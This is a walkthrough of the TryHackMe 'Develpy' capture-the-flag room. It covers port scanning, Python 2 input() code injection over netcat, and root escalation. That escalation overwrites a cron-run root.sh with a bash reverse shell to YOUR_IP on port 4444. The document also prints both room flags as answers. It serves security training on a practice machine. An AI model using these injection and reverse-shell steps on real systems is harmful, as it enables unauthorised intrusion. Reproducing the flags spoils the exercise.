# Develpy — TryHackMe Walkthrough

> Boot-to-root machine for FIT and BSides Guatemala CTF. Read user.txt and root.txt.

<p align="center">
  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/47bd9da3ef003a03478334c93013fd3a.png" />
</p>

<p align="center">
  <a href="https://tryhackme.com/room/bsidesgtdevelpy">
    <img src="https://img.shields.io/badge/TryHackMe-Develpy-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Easy-green">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-Code%20Injection%20%7C%20Python%20RCE%20%7C%20Crontab-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | Code Injection (Python `input()` RCE) |
| 3 | Exploiting Crontab |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Perform a full port scan and identify services on non-standard ports
- Recognise a vulnerable Python 2 `input()` function from error messages in Nmap output
- Test and confirm code injection via Netcat
- Use `__import__('os').system()` to break out of a restricted Python prompt
- Enumerate cron jobs to identify a writable root-executed script
- Replace a cron script with a reverse shell payload to escalate to root

---

## Prerequisites

- Basic familiarity with Linux terminal commands and Python syntax
- Nmap and Netcat installed
- Target machine running on TryHackMe (replace `Machine_IP` with your assigned IP)

---

## Task 1 — Develpy

---

### Step 1 — Network Enumeration

**Approach:** Run a full port scan (`-p-`) with aggressive detection flags to ensure no services on high ports are missed.

```
kali@kali:~/CTFs/tryhackme/Develpy$ sudo nmap -A -sS -sC -sV -O -p- Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 20:54 CEST
Nmap scan report for Machine_IP
Host is up (0.034s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 (RSA)
|   256 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 (ECDSA)
|_  256 e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d (ED25519)
10000/tcp open  snet-sensor-mgmt?
| fingerprint-strings:
|   GenericLines:
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 0
|     SyntaxError: unexpected EOF while parsing
|   GetRequest:
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>
|     NameError: name 'GET' is not defined

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 173.85 seconds
```

> **Note:** Two ports are open — **SSH on 22** and an unknown service on **port 10000**. The Nmap fingerprint output is extremely revealing: the error messages show a Python traceback from a file called `exploit.py` that uses `int(input(...))`. In **Python 2**, the `input()` function evaluates whatever the user types as a Python expression before converting it — this is a critical distinction from Python 3's safe `input()`. This tells us the service is a Python 2 script and is likely vulnerable to code injection.

---

### Step 2 — Probing the Service and Confirming Code Injection

**Approach:** Connect to port 10000 with Netcat and interact with the prompt manually. Test different inputs to understand what the script accepts and where injection might be possible.

**Normal number input:**

```
kali@kali:~/CTFs/tryhackme/Develpy$ nc Machine_IP 10000

        Private 0days

 Please enther number of exploits to send??: 2

Exploit started, attacking target (tryhackme.com)...
Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.041 ms
Exploiting tryhackme internal network: beacons_seq=2 ttl=1337 time=0.055 ms
```

**String input causes a ValueError:**

```
kali@kali:~/CTFs/tryhackme/Develpy$ nc Machine_IP 10000

        Private 0days

 Please enther number of exploits to send??: "a"
Traceback (most recent call last):
  File "./exploit.py", line 6, in <module>
    num_exploits = int(input(' Please enther number of exploits to send??: '))
ValueError: invalid literal for int() with base 10: 'a'
```

**`eval()` with a string argument works as an expression:**

```
kali@kali:~/CTFs/tryhackme/Develpy$ nc Machine_IP 10000

        Private 0days

 Please enther number of exploits to send??: eval("1")

Exploit started, attacking target (tryhackme.com)...
Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.020 ms
```

> **Note:** These tests confirm the vulnerability. In Python 2, `input()` is equivalent to `eval(raw_input())` — whatever the user types is evaluated as Python code **before** being passed to `int()`. When we type `eval("1")`, Python evaluates it to the integer `1`, which passes the `int()` conversion. This means we can inject arbitrary Python expressions. The next step is to use this to execute a system command.

---

### Step 3 — Exploiting Python 2 input() for Code Execution

**Approach:** Use `__import__('os').system('bash')` as the injected input. This imports the `os` module inline and executes bash, spawning a shell over the Netcat connection.

```
kali@kali:~/CTFs/tryhackme/Develpy$ nc Machine_IP 10000

        Private 0days

 Please enther number of exploits to send??: __import__('os').system('bash')
bash: cannot set terminal process group (759): Inappropriate ioctl for device
bash: no job control in this shell
king@ubuntu:~$ whoami
king
king@ubuntu:~$ pwd
/home/king
king@ubuntu:~$ ls
credentials.png  exploit.py  root.sh  run.sh  user.txt
king@ubuntu:~$ cat user.txt
cf85ff769cfaaa721758949bf870b019
```

> **Note:** The shell spawns immediately as user `king`. The `bash: cannot set terminal process group` warning is expected — it means we have a non-interactive shell without full TTY support, but it is functional. The home directory contains several interesting files: `user.txt` (the flag), `run.sh`, `root.sh`, and `credentials.png`. The presence of `root.sh` in the user's home directory alongside the shell is a strong hint towards cron exploitation.

---

### Question 1 — user.txt

<details>
<summary>Reveal Answer</summary>

**`cf85ff769cfaaa721758949bf870b019`**

</details>

---

### Step 4 — Crontab Enumeration

**Approach:** Check `/etc/crontab` to identify any scheduled tasks, particularly any running as root that reference writable files.

```
king@ubuntu:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   king    cd /home/king/ && bash run.sh
*  *    * * *   root    cd /home/king/ && bash root.sh
*  *    * * *   root    cd /root/company && bash run.sh
```

> **Note:** There are three jobs running every minute (`* * * * *`). The critical one is: `root` runs `bash root.sh` from `/home/king/`. This means root executes `/home/king/root.sh` every minute. Since `/home/king/` is `king`'s home directory, we can delete the existing `root.sh` and replace it with a reverse shell — the next time the cron job fires, root will execute our payload.

---

### Step 5 — Replacing root.sh and Catching the Root Shell

**Approach:** Delete the existing `root.sh`, write a bash reverse shell into it, start a Netcat listener, and wait for the cron job to fire.

```
king@ubuntu:~$ rm -rf root.sh
king@ubuntu:~$ echo "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" > root.sh
```

```
kali@kali:~/CTFs/tryhackme/Develpy$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.106.222] from (UNKNOWN) [Machine_IP] 47824
bash: cannot set terminal process group (1227): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/home/king# cd /root
root@ubuntu:~# ls
company
root.txt
root@ubuntu:~# cat root.txt
9c37646777a53910a347f387dce025ec
```

> **Note:** Within one minute the cron job fires, executing our `root.sh` as root. The reverse shell connects back and the `root@ubuntu` prompt confirms full root access. The root flag is found directly in `/root/root.txt`. The `company` directory is also present — this relates to the third cron entry which runs `/root/company/run.sh`, showing there are multiple escalation paths in this room.

---

### Question 2 — root.txt

<details>
<summary>Reveal Answer</summary>

**`9c37646777a53910a347f387dce025ec`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap full port scan (`-p-`) | Found SSH (22) and Python service on port 10000 |
| 2 | Nmap fingerprint analysis | Error messages revealed Python 2 `input()` used in `exploit.py` |
| 3 | Netcat connection to port 10000 | Confirmed interactive Python 2 prompt |
| 4 | Tested various inputs | Confirmed `input()` evaluates expressions — code injection confirmed |
| 5 | `__import__('os').system('bash')` injection | Spawned shell as user `king`, read `user.txt` |
| 6 | `/etc/crontab` inspection | Found `root` executing `bash root.sh` from `/home/king/` every minute |
| 7 | Replaced `root.sh` with reverse shell | Cron fired within 1 minute, caught root shell |
| 8 | Read `root.txt` | Found root flag in `/root/` |
